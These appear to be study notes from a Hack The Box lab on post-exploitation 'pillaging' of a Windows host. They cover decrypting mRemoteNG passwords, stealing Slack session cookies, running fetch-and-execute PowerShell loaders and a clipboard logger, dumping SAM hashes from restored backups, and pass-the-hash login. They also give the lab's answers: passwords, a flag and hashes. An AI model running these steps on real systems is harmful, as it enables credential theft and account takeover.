---
description: >-
  The processthe process of obtaining information from a compromised system of
  obtaining information from a compromised system.
---

# Pillaging

## Scenario

![assume that we have gained a foothold on the Windows server](https://academy.hackthebox.com/storage/modules/67/network.png)

## Installed Applications

review them.

**Identifying Common Applications**

```cmd-session
C:\>dir "C:\Program Files"
```

**Get Installed Programs via PowerShell & Registry Keys**

```powershell-session
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                         DisplayVersion    InstallLocation
-----------                                         --------------    ---------------
Adobe Acrobat DC (64-bit)                           22.001.20169      C:\Program Files\Adobe\Acrobat DC\
CORSAIR iCUE 4 Software                             4.23.137          C:\Program Files\Corsair\CORSAIR iCUE 4 Software
Google Chrome                                       103.0.5060.134    C:\Program Files\Google\Chrome\Application
Google Drive                                        60.0.2.0          C:\Program Files\Google\Drive File Stream\60.0.2.0\GoogleDriveFS.exe
Microsoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
Microsoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:\Program Files (x86)\Microsoft Office
mRemoteNG                                           1.62              C:\Program Files\mRemoteNG
. . .
```

**mRemoteNG**

a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols.

It saves connection info and credentails to `confCons.xml` , the default password is <mark style="color:blue;">**mR3m**</mark>. By default the config file is located in&#x20;

* `%USERPROFILE%\APPDATA\Roaming\mRemoteNG`

**Discover mRemoteNG Configuration Files**

```powershell-session
PS C:\htb> ls C:\Users\julio\AppData\Roaming\mRemoteNG

    Directory: C:\Users\julio\AppData\Roaming\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

**confCons.xml**

```xml
<?XML version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe" ConfVersion="2.6">
    <Node Name="RDP_Domain" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="096332c1-f405-4e1e-90e0-fd2a170beeb5" Username="administrator" Domain="test.local" Password="sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" Hostname="10.0.0.10" Protocol="RDP" PuttySession="Default Settings" Port="3389"
    ..SNIP..
</Connections>
```

**Decrypt the Password with mremoteng\_decrypt**

{% embed url="https://github.com/haseebT/mRemoteNG-Decrypt" %}
Script to decrypt the password
{% endembed %}

```shell-session
python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==" 

Password: ASDki230kasd09fk233aDA
```

If it doesn't has a custom password set then use the above command, if it does, then add the -p and define the password.

```shell-session
python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p admin

Password: ASDki230kasd09fk233aDA
```

**For Loop to Crack the Master Password with mremoteng\_decrypt**

{% code overflow="wrap" %}
```bash
for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
```
{% endcode %}

## Abusing Cookies to Get Access to IM Clients

> instant messaging (IM) applications like `Slack` and `Microsoft Teams`

**Cookie Extraction from Firefox**

Firefox saves the cookies in an SQLite database in a file named `cookies.sqlite`. This file is in each user's APPDATA directory `%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release`.

**Copy Firefox Cookies Database**

```powershell-session
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

{% embed url="https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py" %}
to extract cookies from the Firefox cookies.SQLite database.
{% endembed %}

**Extract Slack Cookie from Firefox Cookies Database**

```shell-session
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```

{% embed url="https://cookie-editor.cgagnier.ca/" %}
After getting the cookie from firefox we can use this extension to add it to our browser.
{% endembed %}

![Navigate to slac.com and modify the value of d cookie](https://academy.hackthebox.com/storage/modules/67/replace-cookie.jpg)

![Refresh the page and see that you are logged in as the user.](https://academy.hackthebox.com/storage/modules/67/cookie-access.jpg)

![add the cookie again](https://academy.hackthebox.com/storage/modules/67/replace-cookie2.jpg)

After gaining access, we can use built-in functions to search for common words like passwords, credentials, PII, or any other information.

![Gaining access and finding credentials.](https://academy.hackthebox.com/storage/modules/67/search-creds-slack.jpg)

**Cookie Extraction from Chromium-based Browsers**

Chromium uses `DPAPI` to encrypt their password similar to local incrypted password found in the previous sections.



**PowerShell Script - Invoke-SharpChromium**

{% embed url="https://github.com/S3cur3Th1sSh1t/PowerSharpPack/" %}
This is the script used in the below snippet
{% endembed %}

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

[X] Exception: Could not find file 'C:\Users\lab_admin\AppData\Local\Google\Chrome\User Data\\Default\Cookies'.

   at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
   at System.IO.File.InternalCopy(String sourceFileName, String destFileName, Boolean overwrite, Boolean checkout)
   at Utils.FileUtils.CreateTempDuplicateFile(String filePath)
   at SharpChromium.ChromiumCredentialManager.GetCookies()
   at SharpChromium.Program.extract data(String path, String browser)
[*] Finished Google Chrome extraction.

[*] Done.
```

The error is because it is looking at the wrong location while the actual file is locatd in `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies`&#x20;

**Copy Cookies to SharpChromium Expected Location**

```powershell-session
PS C:\htb> copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```

**Invoke-SharpChromium Cookies Extraction**

```powershell-session
PS C:\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

--- Chromium Cookie (User: lab_admin) ---
Domain         : slack.com
Cookies (JSON) :
[

<SNIP>

{
    "domain": ".slack.com",
    "expirationDate": 1974643257.67155,
    "hostOnly": false,
    "httpOnly": true,
    "name": "d",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": false,
    "storeId": null,
    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yiEC3NnxQra8uw6IYh2Q9prDawms%2FG72og092YE0URsfXzxHizC2OAGyzmIzh2j1JoMZNdoOaI9DpJ1Dlqrv8rORsOoRW4hnygmdR59w9Kl%2BLzXQshYIM4hJZgPktT0WOrXV83hNeTYg%3D%3D"
},
{
    "domain": ".slack.com",
    "hostOnly": false,
    "httpOnly": true,
    "name": "d-s",
    "path": "/",
    "sameSite": "lax",
    "secure": true,
    "session": true,
    "storeId": null,
    "value": "1659023172"
},

<SNIP>

]

[*] Finished Google Chrome extraction.

[*] Done.
```

## Clipboard

{% embed url="https://github.com/inguardians/Invoke-Clipboard" %}
script to extract user clipboard data.
{% endembed %}

**Monitor the Clipboard with PowerShell**

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
PS C:\htb> Invoke-ClipboardLogger
```

**Capture Credentials from the Clipboard with Invoke-ClipboardLogger**

```powershell-session
PS C:\htb> Invoke-ClipboardLogger

https://portal.azure.com

Administrator@something.com

Sup9rC0mpl2xPa$$ws0921lk
```

> wait until we capture sensitive information.

## Roles and Services

**Attacking Backup Servers**

If we gain access to a `backup system`, we may be able to review backups, search for interesting hosts and restore the data we want.

* `Restic` is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.
* `Restic` checks if the environment variable `RESTIC_PASSWORD` is set and uses its content as the password for the repository.

**restic - Initialize Backup Directory**

```powershell-session
PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init

    Directory: E:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          8/9/2022   2:16 PM                restic2
enter password for new repository:
enter password again:
created restic repository fdb2e6dd1d at E:\restic2

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```

**restic - Back up a Directory**

```powershell-session
PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder

repository fdb2e6dd opened successfully, password is correct
created new cache in C:\Users\jeff\AppData\Local\restic
no parent snapshot found, will read all files

Files:           1 new,     0 changed,     0 unmodified
Dirs:            2 new,     0 changed,     0 unmodified
Added to the repo: 927 B

processed 1 files, 22 B in 0:00
snapshot 9971e881 saved
```

If we want to backup `C:\Windows`, we can use `--use-fs-snapshot` to create VSS (Volume Shadow Copy)

**restic - Back up a Directory with VSS**

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

repository fdb2e6dd opened successfully, password is correct
no parent snapshot found, will read all files
creating VSS snapshot for [c:\]
successfully created snapshot for [c:\]
error: Open: open \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config: Access is denied.

Files:           0 new,     0 changed,     0 unmodified
Dirs:            3 new,     0 changed,     0 unmodified
Added to the repo: 914 B

processed 0 files, 0 B in 0:02
snapshot b0b6f4bb saved
Warning: at least one source file could not be read
```

> If the user doesn't have the rights to access or copy the content of a directory, we may get an Access denied message

**restic - Check Backups Saved in a Repository**

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ snapshots

repository fdb2e6dd opened successfully, password is correct
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
9971e881  2022-08-09 14:18:59  PILLAGING-WIN01              C:\SampleFolder
b0b6f4bb  2022-08-09 14:19:41  PILLAGING-WIN01              C:\Windows\System32\config
afba3e9c  2022-08-09 14:35:25  PILLAGING-WIN01              C:\Users\jeff\Documents
--------------------------------------------------------------------------------------
3 snapshots
```

**restic - Restore a Backup with ID**

```powershell-session
PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore

repository fdb2e6dd opened successfully, password is correct
restoring <Snapshot 9971e881 of [C:\SampleFolder] at 2022-08-09 14:18:59.4715994 -0700 PDT by PILLAGING-WIN01\jeff@PILLAGING-WIN01> to C:\Restore
```

## Assessment

<details>

<summary>Access the target machine using Peter's credentials and check which applications are installed. What's the application installed used to manage and connect to remote systems?</summary>

![](<../../../.gitbook/assets/image (122).png>)

mremoteng

</details>

<details>

<summary>Find the configuration file for the application you identify and attempt to obtain the credentials for the user Grace. What is the password for the local account, Grace?</summary>

{% code title="confCons.xml" overflow="wrap" %}
```xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="AllGNAWw3JJdXFuMG06ssHKpMbWw7AHXKWZVidfNIu5LNVm2nzroKSKtYYfsK66/itwh95OaYLtEX8NA7xy7IMwr" ConfVersion="2.6">
    <Node Name="Grace_Local_Acct" Type="Connection" Descr="Grace Account" Icon="mRemoteNG" Panel="General" Id="88291c0c-b6b0-4f2d-b180-81d3b50485a4" Username="grace" Domain="PILLAGING-WIN01" Password="s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ=" Hostname="localhost" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" 
    . . . />
```
{% endcode %}

Credential cracking.

```bash
python3 mremoteng_decrypt.py -s "s1LN9UqWy2QFv2aKvGF42YRfFvp0bytu04yyCuVQiI12MQvkYT3XcOxWaLTz0aSNjRjr3Rilf6Xb4XQ="                               
Password: Princess01!
```

</details>

<details>

<summary>Log in as Grace and find the cookies for the slacktestapp.com website. Use the cookie to log in into slacktestapp.com from a browser within the RDP session and submit the flag.</summary>

```
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

<img src="../../../.gitbook/assets/image (100).png" alt="" data-size="original">

```
python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
(10, '', 'd', 'xoxd-VGhpcyBpcyBhIGNvb2tpZSB0byBzaW11bGF0ZSBhY2Nlc3MgdG8gU2xhY2ssIHN0ZWFsaW5nIGEgY29va2llIGZyb20gYSBicm93c2VyLg==', '.api.slacktestapp.com', '/', 7975292868, 1663945037085000, 1663945037085002, 0, 0, 0, 1, 0, 2)
```

![](<../../../.gitbook/assets/image (121).png>)

<img src="../../../.gitbook/assets/image (110) (1).png" alt="" data-size="original">

```
HTB{Stealing_Cookies_To_AccessWebSites}
```

</details>

<details>

<summary>Log in as Jeff via RDP and find the password for the restic backups. Submit the password as the answer.</summary>

![](<../../../.gitbook/assets/image (119) (1).png>)

```
jeff:Webmaster001!
```

![](<../../../.gitbook/assets/image (116) (1).png>)



</details>

<details>

<summary>Restore the directory containing the files needed to obtain the password hashes for local users. Submit the Administrator hash as the answer.</summary>

```
PS C:\Users\jeff> restic.exe -r E:\restic\ snapshots
enter password for repository:
repository 2e40703c opened successfully, password is correct
found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
ID        Time                 Host             Tags        Paths
--------------------------------------------------------------------------------------
02d25030  2022-08-09 05:58:15  PILLAGING-WIN01              C:\xampp\htdocs\webapp
24504d3d  2022-08-09 11:24:43  PILLAGING-WIN01              C:\Windows\System32\config
7b9cabc8  2022-08-09 11:25:47  PILLAGING-WIN01              C:\Windows\System32\config
4e7bd0cd  2022-08-09 11:55:33  PILLAGING-WIN01              C:\xampp\htdocs\webapp_old
b2f5caa0  2022-08-17 11:43:56  PILLAGING-WIN01              C:\Windows\System32\config
--------------------------------------------------------------------------------------
5 snapshots
PS C:\Users\jeff>
```

```
PS C:\Users\jeff> $env:RESTIC_PASSWORD = 'Superbackup!'
PS C:\Users\jeff> restic.exe -r E:\restic\ restore b2f5caa0 --target C:\Restore
repository 2e40703c opened successfully, password is correct
found 1 old cache directories in C:\Users\jeff\AppData\Local\restic, run `restic cache --cleanup` to remove them
restoring <Snapshot b2f5caa0 of [C:\Windows\System32\config] at 2022-08-17 11:43:56.2484457 -0700 PDT by PILLAGING-WIN01\Administrator@PILLAGING-WIN01> to C:\Restore
```

Access the folder and obtain the SAM SECURITY SYSTEM

![](<../../../.gitbook/assets/image (120).png>)



```
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x9828e7264dd454a4cae19b10e003858e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b477f26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2525a827e7ca4bb2504d25a70e4d1292:::
jeff:1004:aad3b435b51404eeaad3b435b51404ee:91b2e2ed6cd72ed531635c1b58eabe19:::
Grace:1005:aad3b435b51404eeaad3b435b51404ee:2abc09f151d5e95fb8805e265268e6c3:::
Peter:1006:aad3b435b51404eeaad3b435b51404ee:8160b16dddc064509c4ccf530c7dfaa0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x0c515ca185a031a258fba59bfe8b9b5079b9cd81
dpapi_userkey:0x87780b202abd6fd714986a152e820acdf3679f58
[*] NL$KM 
 0000   72 A4 3D 8A DE 00 7E FB  6E 82 26 A0 57 A3 10 E9   r.=...~.n.&.W...
 0010   DC F0 E9 DA E5 1B 7E 94  83 EE 9F B5 3E A7 73 C1   ......~.....>.s.
 0020   C7 A8 0C 92 1A 3F 77 A1  12 77 20 4F 66 69 2A 31   .....?w..w Ofi*1
 0030   B8 CC 43 3B AE EF 8D B4  AB F1 80 23 3F E0 E7 BA   ..C;.......#?...
NL$KM:72a43d8ade007efb6e8226a057a310e9dcf0e9dae51b7e9483ee9fb53ea773c1c7a80c921a3f77a11277204f66692a31b8cc433baeef8db4abf180233fe0e7ba
[*] Cleaning up...
```

**aad3b435b51404eeaad3b435b51404ee**

_<mark style="color:purple;">**Optional**</mark>_

```
evil-winrm -i 10.129.203.122 -u Administrator -H bac9dc5b7b4bec1d83e0e9c04b477f26
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
pillaging-win01\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

</details>

